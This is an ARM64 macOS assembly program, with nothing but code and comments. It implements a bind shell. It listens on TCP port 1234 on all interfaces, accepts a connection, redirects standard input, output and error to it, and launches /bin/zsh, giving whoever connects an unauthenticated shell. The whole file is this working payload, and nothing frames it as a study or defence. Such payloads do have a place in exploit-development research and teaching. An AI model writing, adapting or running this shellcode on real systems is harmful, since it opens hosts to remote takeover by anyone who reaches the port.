.global _main
.align 4

_main:
    ;;; (1) obtain socket descriptor
    mov     X3, #0x0201                 ; domain = PF_INET
    lsr     X0, X3, #8                  ;
    lsr     X1, X0, #1                  ; type = SOCK_STREAM
    mov     X2, XZR                     ; protocol = IPPROTO_IP
    mov     X16, #97                    ; BSD system call 97 for socket
    svc     #0xFFFF                     ; call kernel to obtain socket descriptor
    lsl     X19, X0, #0                 ; save socket descriptor in X19
    ;;; (2) bind socket to a local address
    mov     X2, #16                     ; address_len = 16 bytes
    mov     X4, #0x0200                 ; sin_len = 0, sin_family = 2
    movk    X4, #0xD204, lsl#16         ; sin_port = 1234 = 0x04D2 (big endian)
    stp     X4, XZR, [SP,#-16]!         ; push sockaddr_in struct to stack
    add     X1, SP, XZR                 ; pointer to sockaddr_in struct
    mov     X16, #104                   ; BSD system call 104 for bind
    svc     #0xFFFF                     ; call kernel to bind socket to local address 0.0.0.0
    ;;; (3) listen for incoming connections
    mov     X0, X19                     ; restore saved socket descriptor
    mov     X1, XZR                     ; backlog = Null
    mov     X16, #106                   ; BSD system call 106 for listen
    svc     #0xFFFF                     ; call kernel to listen
    ;;; (4) accept incoming connection
    mov     X0, X19                     ; restore saved socket descriptor
    mov     X1, XZR                     ; ingore address storage
    mov     X2, XZR                     ; ingore length of address struct
    mov     X16, #30                    ; BSD system call 30 for accept
    svc     #0xFFFF                     ; call kernel to accept incoming connections
    lsl     X20, X0, #0                 ; save new socket descriptor to X20
    ;;; (5) duplicate file descriptors STDIN, STDOUT, STDERR
    mov     X16, #90                    ; BSD system call 90 for dup2
    mov     X1, #0x0201                 ; file descriptor 2 = STDERR
    lsr     X1, X1, #8                  ;
    svc     #0xFFFF                     ; call kernel to duplicate STDERR
    mov     X0, X20                     ; restore new socket descriptor to X0
    mov     X1, #0x0101                 ; file descriptor 1 = STDOUT
    lsr     X1, X1, #8                  ;
    svc     #0xFFFF                     ; call kernel to duplicate STDOUT
    mov     X0, X20                     ; restore new socket descriptor to X0
    lsr     X1, X1, #1                  ; file descriptor 0 = STDIN
    svc     #0xFFFF                     ; call kernel to duplicate STDIN
    ;;; (6) launch shell via execve
    mov     X3, #0x622F                 ; move "/bin/zsh" into X3 (little endian)
    movk    X3, #0x6E69, lsl#16         ;
    movk    X3, #0x7A2F, lsl#32         ;
    movk    X3, #0x6873, lsl#48         ;
    stp     X3, XZR, [SP,#-16]!         ; push path and terminating 0 to stack
    add     X0, SP, XZR                 ; save pointer to path = argv[0] in X0
    stp     X0, XZR, [SP,#-16]!         ; push argv and terminating 0 to stack
    add     X1, SP, XZR                 ; move pointer to argument array into X1
    mov     X2, XZR                     ; third argument for execve ignored
    mov     X16, #59                    ; BSD system call 59 for execve
    svc     #0xFFFF                     ; execute system call to launch shell
